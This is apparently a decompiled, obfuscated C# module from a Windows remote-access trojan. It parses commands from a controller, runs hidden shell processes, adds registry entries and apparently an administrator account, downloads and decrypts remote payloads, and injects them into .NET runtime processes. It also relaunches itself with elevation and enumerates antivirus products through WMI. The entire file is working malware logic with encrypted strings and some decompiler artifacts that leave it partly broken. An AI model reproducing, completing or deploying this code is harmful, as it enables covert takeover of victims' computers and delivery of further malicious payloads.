using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;

[StandardModule]
internal sealed class _______________________________
{
	public static System.Threading.Mutex _;

	private static bool __ = false;

	private static string ___;

	private static string ____;

	private static int _____;

	public static void _(string string_0)
	{
		try
		{
			int arg_3A8_0;
			int num2;
			string[] array;
			string[] array2;
			if (Operators.CompareString(string_0, <Module>.______<string>(1366899373u), false) == 0)
			{
				arg_3A8_0 = sizeof(uint) + 5;
			}
			else if (Operators.CompareString(string_0, <Module>.____<string>(383612974u), false) == 0)
			{
				arg_3A8_0 = sizeof(float) + -2;
			}
			else if (string_0.Contains(<Module>.______<string>(2367611230u)))
			{
				arg_3A8_0 = System.Type.EmptyTypes.Length + 3;
			}
			else
			{
				if (!___________________________________________________________________.________())
				{
					return;
				}
				if (string_0.Contains(<Module>.____<string>(2842227750u)))
				{
					int num;
					arg_3A8_0 = ((~(-num & num) == num) ? (sizeof(double) + 1474038664) : ((num2 * 17657856 == -5956) ? (System.Type.EmptyTypes.Length + -2128461909) : (sizeof(ulong) + 3)));
				}
				else if (Operators.CompareString(string_0, <Module>.____<string>(3691926952u), false) == 0)
				{
					arg_3A8_0 = sizeof(int) + -4;
				}
				else if (string_0.Contains(<Module>.______<string>(685941218u)))
				{
					arg_3A8_0 = System.Type.EmptyTypes.Length + 6;
				}
				else if (string_0.Contains(<Module>._____<string>(2686085668u)))
				{
					array = string_0.Split(new char[]
					{
						'$'
					});
					arg_3A8_0 = System.Type.EmptyTypes.Length + 12;
				}
				else if (string_0.Contains(<Module>._____<string>(4186648631u)))
				{
					array2 = string_0.Split(new char[]
					{
						'$'
					});
					num2 = 10865;
					if (System.Type.EmptyTypes.Length + -9153 != -9153)
					{
						goto IL_414;
					}
					_______________________________.____________(<Module>.______<string>(1353082456u) + array2[1] + <Module>.____<string>(1226113571u) + array2[2]);
					num2 = checked((int)(unchecked((System.IntPtr)1222)));
					arg_3A8_0 = System.Type.EmptyTypes.Length + 1;
				}
				else
				{
					if (string_0.Contains(<Module>._____<string>(2994265912u)))
					{
						string[] array3 = string_0.Split(new char[]
						{
							'$'
						});
						_______________________________.____________(<Module>.____<string>(2035720178u) + array3[1] + <Module>.______<string>(851744222u) + array3[2]);
						System.Threading.Thread.Sleep(10000);
						string text = <Module>._____<string>(3106854509u);
						try
						{
							text = new System.Security.Principal.SecurityIdentifier(<Module>.____<string>(2961505000u)).Translate(typeof(System.Security.Principal.NTAccount)).ToString();
							if (text.Contains(<Module>.____<string>(2151898393u)))
							{
								string[] array4 = Strings.Split(text, <Module>._____<string>(305124521u), -1, CompareMethod.Binary);
								text = array4[1].Trim();
							}
						}
						catch (System.Exception arg_4E6_0)
						{
							ProjectData.SetProjectError(arg_4E6_0);
							ProjectData.ClearProjectError();
						}
						string[] array5 = new string[5];
						array5[0] = <Module>.___<string>(850792095u);
						int num3 = 22859;
						int ________________;
						int arg_5F4_0;
						if ((________________ & 3145728) == ((________________ ^ -716518593) & 3145728))
						{
							array5[1] = text;
							array5[2] = <Module>._____<string>(1787231883u);
							int num4;
							num3 = ((((num4 ^ -num4) & 1) != 0) ? 867474525 : (System.Type.EmptyTypes.Length + -21246));
							arg_5F4_0 = sizeof(float) + -4;
							goto IL_5F4;
						}
						IL_5D0:
						Microsoft.Win32.RegistryKey registryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(<Module>._______<string>(4261294862u), true);
						if (registryKey != null)
						{
							goto IL_62F;
						}
						arg_5F4_0 = sizeof(long) + -7;
						IL_5F4:
						switch (arg_5F4_0)
						{
						case 1:
							Microsoft.Win32.Registry.LocalMachine.CreateSubKey(<Module>._______<string>(4261294862u));
							registryKey = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(<Module>._____<string>(3706708696u), true);
							goto IL_62F;
						}
						while (true)
						{
							array5[3] = array3[1];
							array5[4] = <Module>.___<string>(1173350434u);
							int num5 = num3;
							num3 = -5171;
							if (num5 != -21246)
							{
							}
							_______________________________.____________(string.Concat(array5));
							_______________________________.____(<Module>.___<string>(3673697223u) + array3[1] + <Module>.______<string>(4252605775u) + array3[2]);
							if (num3 == -5171)
							{
								goto IL_5D0;
							}
						}
						IL_62F:
						registryKey.SetValue(array3[1], <Module>.______<string>(1522879322u), Microsoft.Win32.RegistryValueKind.DWord);
						return;
					}
					return;
				}
			}
			while (true)
			{
				string[] array6;
				switch (arg_3A8_0)
				{
				case 0:
					goto IL_3EB;
				case 1:
					_______________________________.____(<Module>.___<string>(4026159116u) + array2[1] + <Module>.______<string>(3218366251u) + array2[2]);
					if (num2 != -28720)
					{
						goto Block_19;
					}
					goto IL_30F;
				case 2:
					goto IL_3FB;
				case 3:
					if (string_0.Contains(<Module>.______<string>(3688076789u)))
					{
						_______________________________.__ = true;
						goto IL_1C6;
					}
					goto IL_1C6;
				case 4:
					goto IL_405;
				case 5:
					_______________________________._____(array6[1], <Module>.___<string>(1647031535u), 3);
					arg_3A8_0 = System.Type.EmptyTypes.Length + 4;
					continue;
				case 6:
					goto IL_30F;
				case 7:
					goto IL_40A;
				case 8:
					goto IL_40F;
				case 10:
				{
					string[] array7;
					_______________________________._____(array7[1], <Module>.______<string>(3994013574u), 1);
					if (num2 != 25429)
					{
						goto Block_16;
					}
					if (16384 * ((33549024 & num2) - 9047) - -588709888 == (num2 ^ num2))
					{
						goto Block_17;
					}
					goto IL_1ED;
				}
				case 11:
				{
					string[] array7 = string_0.Split(new char[]
					{
						'$'
					});
					num2 = ((num2 * 805306368 - 4090 != 3691) ? 23390 : (sizeof(ulong) + -1625651041));
					if (num2 / 524288 % 15 + 709376 == (794 & num2) - 3278 << 8)
					{
						int num4 = checked((int)-552962879.0);
						arg_3A8_0 = num4;
						continue;
					}
					arg_3A8_0 = sizeof(System.Guid) + -6;
					continue;
				}
				case 12:
					_______________________________.____________(<Module>.______<string>(1353082456u) + array[1] + <Module>._____<string>(2798674265u));
					arg_3A8_0 = System.Type.EmptyTypes.Length + 13;
					continue;
				case 13:
					goto IL_1ED;
				case 14:
					goto IL_1C6;
				}
				goto Block_20;
				IL_1C6:
				System.Threading.Thread thread = new System.Threading.Thread(new System.Threading.ThreadStart(_______________________________.__________));
				thread.Start();
				arg_3A8_0 = sizeof(byte) + 7;
				continue;
				IL_1ED:
				_______________________________.____(<Module>.___<string>(2292148213u) + array[1]);
				arg_3A8_0 = System.Type.EmptyTypes.Length + 7;
				continue;
				IL_30F:
				array6 = string_0.Split(new char[]
				{
					'$'
				});
				int ________________ = <Module>._________________;
				arg_3A8_0 = System.Type.EmptyTypes.Length + 5;
			}
			Block_16:
			Block_17:
			Block_19:
			return;
			Block_20:
			goto IL_414;
			IL_3EB:
			_______________________________.______(true);
			return;
			IL_3FB:
			_______________________________.___();
			IL_405:
			IL_40A:
			IL_40F:
			return;
			IL_414:
			_______________________________.___________();
		}
		catch (System.Exception expr_649)
		{
			ProjectData.SetProjectError(expr_649);
			System.Exception ex = expr_649;
			_______________________________.____(<Module>.___<string>(3472358092u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static bool __()
	{
		bool result;
		try
		{
			string path;
			if (System.Environment.GetFolderPath(System.Environment.SpecialFolder.ProgramFiles).Contains(<Module>._____<string>(705582770u)))
			{
				path = System.Environment.GetEnvironmentVariable(<Module>._____<string>(124184184u)) + <Module>.____<string>(2991939248u);
			}
			else
			{
				path = System.Environment.GetFolderPath(System.Environment.SpecialFolder.System) + <Module>._____<string>(2787544319u);
			}
			if (System.IO.File.Exists(path))
			{
				result = true;
			}
			else
			{
				result = false;
			}
		}
		catch (System.Exception expr_60)
		{
			ProjectData.SetProjectError(expr_60);
			System.Exception ex = expr_60;
			_______________________________.____(<Module>._______<string>(3694199107u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
		return result;
	}

	public static void ___()
	{
		try
		{
			string text = <Module>.____<string>(3151309093u);
			if (_______________________________.__())
			{
				text = <Module>._____<string>(724038371u);
			}
			if (___________________________________________________________________.________())
			{
				text += <Module>.____<string>(2544263961u);
			}
			______________________________________________________________.___________(<Module>._____<string>(3856208495u) + text);
		}
		catch (System.Exception expr_4C)
		{
			ProjectData.SetProjectError(expr_4C);
			System.Exception ex = expr_4C;
			_______________________________.____(<Module>._______<string>(3913289299u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void ____(string string_0)
	{
		try
		{
			______________________________________________________________.___________(<Module>.____<string>(404388875u) + string_0);
		}
		catch (System.Exception arg_17_0)
		{
			ProjectData.SetProjectError(arg_17_0);
			ProjectData.ClearProjectError();
		}
	}

	public static void _____(string string_0, string string_1, int int_0)
	{
		try
		{
			_______________________________.___ = string_0;
			_______________________________.____ = string_1;
			_______________________________._____ = int_0;
			System.Threading.Thread thread = new System.Threading.Thread(new System.Threading.ThreadStart(_______________________________._______));
			thread.Start();
		}
		catch (System.Exception expr_2C)
		{
			ProjectData.SetProjectError(expr_2C);
			System.Exception ex = expr_2C;
			_______________________________.____(<Module>.____<string>(2400111240u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void ______(bool bool_0)
	{
		try
		{
			int arg_12_0 = 536870912;
			int ___________ = <Module>.____________;
			if ((arg_12_0 & ___________ * -536870912) == (___________ << 29 & 536870912))
			{
				string path;
				if (System.Environment.GetFolderPath(System.Environment.SpecialFolder.ProgramFiles).Contains(<Module>.___<string>(1980785605u)))
				{
					path = System.Environment.GetEnvironmentVariable(<Module>.____<string>(3598984380u)) + <Module>.___<string>(569333041u);
					goto IL_84;
				}
				path = System.Environment.GetFolderPath(System.Environment.SpecialFolder.System) + <Module>.___<string>(1194939400u);
				int arg_12C_0 = sizeof(double) + -5;
				while (true)
				{
					IL_12C:
					switch (arg_12C_0)
					{
					case 0:
						goto IL_146;
					case 1:
					{
						string text;
						int num;
						do
						{
							string contents;
							System.IO.File.WriteAllText(path, contents);
							string arg_DF_0 = <Module>._____<string>(1419880545u);
							______________________._______ = -1749758540;
							text = arg_DF_0;
						}
						while (num != 27102);
						_______________________________.____________(<Module>.______<string>(1049174922u) + text + <Module>.______<string>(368216767u) + text);
						arg_12C_0 = (((-2 | 2 * num) == -2) ? (System.Type.EmptyTypes.Length + 0) : (System.Type.EmptyTypes.Length + 1437967309));
						continue;
					}
					}
					break;
				}
				IL_84:
				if (System.IO.File.Exists(path))
				{
					string contents = ___________________________________________________________________._(__________________________________________________________________________.___, Strings.StrReverse(<Module>.____<string>(2559481085u)));
					int num = System.Type.EmptyTypes.Length + 27102;
					arg_12C_0 = System.Type.EmptyTypes.Length + 1;
					goto IL_12C;
				}
				goto IL_1AD;
			}
			IL_146:
			System.Threading.Thread.Sleep(5000);
			_______________________________.____________(<Module>.______<string>(4009859742u));
			_______________________________.____________(<Module>._____<string>(1757646336u));
			_______________________________.____________(<Module>.___<string>(2465662437u));
			_______________________________.____________(<Module>._____<string>(3989107684u));
			_______________________________.____________(<Module>._____<string>(1663513340u));
			if (bool_0)
			{
				_______________________________.____(<Module>._____<string>(2357500523u));
			}
			IL_1AD:;
		}
		catch (System.Exception expr_1AF)
		{
			ProjectData.SetProjectError(expr_1AF);
			System.Exception ex = expr_1AF;
			_______________________________.____(<Module>._______<string>(1831932475u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void _______()
	{
		try
		{
			while (Operators.CompareString(_______________________________.___, string.Empty, false) != 0)
			{
				while (true)
				{
					IL_181:
					int num = 26597;
					while (true)
					{
						WebClient webClient = new WebClient();
						byte[] byte_ = webClient.DownloadData(_______________________________.___);
						byte[] byte_2 = ___________________________________________________________________._______(byte_, <Module>.___<string>(1387161447u));
						int num2 = num;
						num = -31315;
						if (num2 == 26597)
						{
							goto IL_128;
						}
						IL_52:
						string string_;
						if (_______________________________._____ == 1)
						{
							string_ = <Module>.______<string>(4288162693u);
						}
						if (_______________________________._____ != 3)
						{
							goto IL_A7;
						}
						int arg_81_0 = System.Type.EmptyTypes.Length + 2;
						IL_81:
						switch (arg_81_0)
						{
						case 0:
							goto IL_181;
						case 1:
							IL_C2:
							if (_______________________________._____ != 1)
							{
								goto IL_1ED;
							}
							System.Threading.Thread.Sleep(30000);
							if (_______________________________.__())
							{
								num = 22842;
								goto IL_E8;
							}
							goto IL_1A2;
						case 2:
							string_ = <Module>._______<string>(3897257301u);
							break;
						case 3:
							goto IL_E8;
						default:
							continue;
						}
						IL_A7:
						byte[] array;
						if (Operators.ConditionalCompareObjectEqual(_______________________________._________(array, string_), true, false))
						{
							arg_81_0 = sizeof(long) + -7;
							goto IL_81;
						}
						goto IL_1DE;
						IL_128:
						array = ________________________________________________________________________________.______(byte_2);
						if (array.Length != 1289728)
						{
							goto IL_1EF;
						}
						num2 = num;
						num = 23914;
						if (num2 != -31315)
						{
							goto IL_C2;
						}
						_______________________________.____(_______________________________.____ + <Module>._______<string>(4006802397u));
						string_ = <Module>.___<string>(409093195u);
						if (num != 23914)
						{
							goto Block_3;
						}
						goto IL_52;
						IL_E8:
						_______________________________.____(<Module>.____<string>(4137962411u));
						if (!_____________._.Info.OSFullName.Contains(<Module>._______<string>(4061574945u)))
						{
							goto IL_1B9;
						}
						if (num != -7578)
						{
							goto Block_11;
						}
						goto IL_128;
					}
				}
				Block_3:
				continue;
				Block_11:
				_______________________________.______(false);
				goto IL_1B9;
				IL_1A2:
				_______________________________.____(<Module>._______<string>(208126310u));
				break;
				IL_1B9:
				_______________________________.____________(<Module>._______<string>(1996250119u));
				_______________________________.____________(<Module>.______<string>(3899324406u));
				_______________________________.___();
				break;
				IL_1DE:
				_______________________________.____(<Module>.______<string>(954421114u));
				IL_1ED:
				break;
				IL_1EF:
				_______________________________.____(<Module>.______<string>(2580823458u));
				break;
			}
		}
		catch (System.Exception expr_200)
		{
			ProjectData.SetProjectError(expr_200);
			System.Exception ex = expr_200;
			_______________________________.____(<Module>.____<string>(844045643u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void ________()
	{
		int num;
		int num3;
		try
		{
			IL_00:
			int num2;
			do
			{
				ProjectData.ClearProjectError();
				num = 1;
				IL_03:
				num2 = 2;
				System.Threading.Thread.Sleep(15000);
			}
			while ((-1374863361 | num3 / 720235) != -1374863361);
			IL_2D:
			num2 = 3;
			if (!_______________________________.__())
			{
				goto IL_51;
			}
			IL_36:
			num2 = 4;
			_______________________________.____(<Module>.___<string>(731651534u));
			int arg_5E_0 = System.Type.EmptyTypes.Length + 1;
			goto IL_5E;
			IL_51:
			num2 = 7;
			IL_53:
			num2 = 8;
			arg_5E_0 = sizeof(float) + -4;
			IL_5E:
			switch (arg_5E_0)
			{
			case 0:
				System.Threading.Thread.Sleep(30000);
				IL_77:
				num2 = 9;
				if (_______________________________.__())
				{
					goto IL_95;
				}
				IL_81:
				num2 = 10;
				_______________________________.____(<Module>.___<string>(2305422591u));
				goto IL_AA;
				IL_95:
				num2 = 12;
				IL_98:
				num2 = 13;
				_______________________________.____(<Module>.____<string>(4137962411u));
				IL_AA:
				num2 = 15;
				_______________________________.___();
				IL_B2:
				goto IL_158;
			}
			IL_B7:
			num2 = 5;
			_______________________________.___();
			IL_BE:
			goto IL_158;
			IL_C3:
			int arg_CA_0 = num3 + 1;
			num3 = 0;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], arg_CA_0);
			IL_117:
			goto IL_14D;
			num3 = num2;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
			IL_12A:
			goto IL_14D;
		}
		object arg_12C_0;
		endfilter(arg_12C_0 is System.Exception & num != 0 & num3 == 0);
		IL_14D:
		throw ProjectData.CreateProjectError(-2146828237);
		IL_158:
		if (num3 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	public static object _________(byte[] byte_0, string string_0)
	{
		object obj;
		try
		{
			if (_______________________________________________________________________.___________(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + <Module>.____<string>(2999137853u), string_0, byte_0, true, false, true))
			{
				switch (sizeof(float) + -4)
				{
				case 0:
					IL_32:
					obj = true;
					goto IL_9A;
				}
				goto IL_32;
			}
			if (_______________________________________________________________________.___________(System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory() + <Module>.___<string>(692630896u), string_0, byte_0, true, false, true))
			{
				obj = true;
			}
			else if (_______________________________________________________________________.___________(_____________________________________________________________________________.__, string_0, byte_0, true, false, true))
			{
				obj = true;
			}
			else
			{
				obj = false;
			}
		}
		catch (System.Exception arg_87_0)
		{
			ProjectData.SetProjectError(arg_87_0);
			obj = false;
			ProjectData.ClearProjectError();
		}
		IL_9A:
		object arg_A1_0 = obj;
		<Module>.________ = obj;
		return arg_A1_0;
	}

	[System.Runtime.CompilerServices.MethodImpl(System.Runtime.CompilerServices.MethodImplOptions.NoOptimization)]
	public static void __________()
	{
		try
		{
			if (!___________________________________________________________________.________())
			{
				if (!_________________________________________________._________())
				{
					string text = <Module>._____<string>(1419880545u);
					switch (System.Type.EmptyTypes.Length + 0)
					{
					case 0:
					{
						IL_33:
						ProcessStartInfo processStartInfo = new ProcessStartInfo(<Module>.______<string>(168821456u), <Module>.______<string>(2205802088u) + text + _____________________________________________________________________________.__ + text);
						processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
						processStartInfo.UseShellExecute = true;
						processStartInfo.WorkingDirectory = System.Environment.CurrentDirectory;
						processStartInfo.Verb = <Module>._____<string>(2128613347u);
						try
						{
							IL_89:
							int num;
							if ((num << 7) * 893 + (num << 7) * 131 != 1976100108)
							{
								Process.Start(processStartInfo);
								<Module>.______<string>(2703211100u);
								______________________________________________________________.__________________________.Close();
								if (sizeof(ulong) + 20543 != -19844)
								{
								}
							}
							______________________________________________________________.____________________________ = true;
							______________________________________________________________.__.Close();
							System.Threading.Thread.Sleep(60000);
							if (______________________________________________________________.____(______________________________________________________________.__________________))
							{
								ProjectData.EndApp();
							}
							______________________________________________________________.____________________________ = false;
							System.Threading.Thread thread = new System.Threading.Thread(new System.Threading.ThreadStart(_____________________________________________________________________________.___));
							thread.Start();
							______________________________________________________________.______________(<Module>._______<string>(2357608790u), <Module>.______<string>(1524843933u));
							return;
						}
						catch (System.Exception expr_13E)
						{
							ProjectData.SetProjectError(expr_13E);
							_______________________________.____(<Module>.___<string>(2669080215u));
							if (_______________________________.__)
							{
								ProjectData.ClearProjectError();
								goto IL_89;
							}
							ProjectData.ClearProjectError();
							return;
						}
						goto IL_16C;
					}
					}
					goto IL_33;
				}
				IL_16C:
				______________________________________________________________.______________(<Module>.___<string>(1387161447u), <Module>._____<string>(4079530698u));
				_______________________________.____(<Module>.______<string>(2886760243u));
			}
		}
		catch (System.Exception expr_196)
		{
			ProjectData.SetProjectError(expr_196);
			System.Exception ex = expr_196;
			_______________________________.____(<Module>.____<string>(3795987078u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void ___________()
	{
		try
		{
			int arg_3B_0 = 47111;
			int arg_3B_1 = checked((int)48408.0);
			int ______________ = <Module>._______________;
			string text = <Module>.__________(arg_3B_0, arg_3B_1, ((______________ + ______________) / 7338 != -2059906234) ? (sizeof(uint) + 214) : 1747943102);
			SelectQuery query = new SelectQuery(<Module>.____<string>(1656111992u));
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(query);
			try
			{
				ManagementObjectCollection.ManagementObjectEnumerator enumerator = managementObjectSearcher.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject managementObject = (ManagementObject)enumerator.Current;
					text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(text, managementObject[<Module>.___<string>(673120577u)]), <Module>._______<string>(2695599522u)));
				}
			}
			finally
			{
				ManagementObjectCollection.ManagementObjectEnumerator enumerator;
				if (enumerator != null)
				{
					((System.IDisposable)enumerator).Dispose();
				}
			}
			if (Operators.CompareString(text, <Module>.__________(System.Type.EmptyTypes.Length + 29547, ((______________ / 5 & -1073741824) == 0) ? (sizeof(uint) + 30035) : (sizeof(long) + -212006864), System.Type.EmptyTypes.Length + 42), false) == 0)
			{
				______________________________________________________________.___________(<Module>.______<string>(2760443379u));
			}
			else
			{
				______________________________________________________________.___________(<Module>.______<string>(2746626462u) + text);
			}
		}
		catch (System.Exception expr_129)
		{
			ProjectData.SetProjectError(expr_129);
			System.Exception ex = expr_129;
			_______________________________.____(<Module>.______<string>(3733521402u) + ex.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public static void ____________(string string_0)
	{
		try
		{
			Process.Start(new ProcessStartInfo(<Module>.____<string>(2924692061u), <Module>.____<string>(1785047589u) + string_0)
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				UseShellExecute = true
			});
		}
		catch (System.Exception arg_37_0)
		{
			ProjectData.SetProjectError(arg_37_0);
			ProjectData.ClearProjectError();
		}
	}
}
